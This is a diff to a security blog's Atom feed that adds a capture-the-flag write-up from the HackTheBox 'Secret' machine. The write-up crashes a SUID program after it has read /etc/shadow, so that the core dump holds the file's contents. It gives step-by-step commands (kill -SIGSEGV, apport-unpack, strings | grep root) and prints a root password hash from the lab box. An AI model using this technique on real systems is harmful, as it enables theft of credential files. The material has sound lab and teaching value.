@@ -4,13 +4,111 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-16T09:26:00+08:00</updated>
+ <updated>2022-01-19T18:32:47+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Core Dump Technique</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/19/core-dump-technique"/>
+   <updated>2022-01-19T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/19/Core-Dump-Technique</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Attacker can force crash a program to generate a coredump so he can read the buffered data (eg&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; ) inside.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment&quot;&gt;Environment&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Program has SUID bit set&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 17824 Oct  7 10:03 count&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Program also forces core dump generation&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;prctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PR_SET_DUMPABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs.suid_dumpable&lt;/code&gt; is set to 2.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/fs/suid_dumpable
+2
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Run program and put a sensitive file and stop at another user input&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./count 
+Enter &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;file/directory name: /etc/shadow
+
+Total characters &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1187
+Total words      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
+Total lines      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
+Save results a file? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Background the program&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./count 
+Enter &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;file/directory name: /etc/shadow
+
+Total characters &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1187
+Total words      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
+Total lines      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 36
+Save results a file? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]: ^Z
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]+  Stopped                 ./count
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt; signal. You can also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kill -BUS PID&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-SIGSEGV&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;pidof count&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Resume the job and you will see core dump has been generated&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;
+./count
+Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lrt&lt;/span&gt; /var/crash/
+total 32
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crash
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;To analyze the coredump, use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apport-unpack&lt;/code&gt; and open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CoreDump&lt;/code&gt; file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /tmp/crash-report/CoreDump | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;root
+root:&lt;span class=&quot;nv&quot;&gt;$6$/&lt;/span&gt;0f5J.S8.u.dA78h&lt;span class=&quot;nv&quot;&gt;$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D&lt;/span&gt;/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::
+dasith@secret:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB secret&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>CMS Made Simple</title>
